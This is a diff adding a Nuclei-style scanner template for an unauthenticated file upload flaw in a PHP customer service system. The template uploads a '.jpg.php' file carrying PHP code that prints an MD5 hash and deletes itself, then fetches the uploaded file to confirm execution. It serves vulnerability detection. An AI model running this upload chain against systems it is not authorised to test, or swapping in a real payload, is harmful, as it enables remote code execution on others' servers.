@@ -1,0 +1,62 @@
+id: php-customer-service-file-upload
+info:
+  name: PHP Customer Service System File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PHP online customer service system supports web and mobile H5 webpage customer service. Due to improper code filtering, it leads to unauthorized arbitrary file upload vulnerability.
+  reference:
+    - https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA
+http:
+  - raw:
+      - |
+        GET /admin/event/uploadimg.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "editormd-image-file"
+  - raw:
+      - |
+        POST /admin/event/uploadimg.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------boundary
+
+        -----------------------------boundary
+        Content-Disposition: form-data; name="editormd-image-file"; filename="{{rand_int(150000,7999999)}}.jpg.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5(233);unlink(__FILE__);?>
+        -----------------------------boundary--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - ".php"
+        part: body
+      - type: regex
+        regex:
+          - "\\\"url\\\"\\s?:\\s?\\\"(.*?)\\\""
+    extractors:
+      - type: regex
+        internal: true
+        group: 1
+        regex:
+          - "\\\"url\\\"\\s?:\\s?\\\"(.*?)\\\""
+  - raw:
+      - |
+        GET {{BaseURL}}{{extractor_1}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
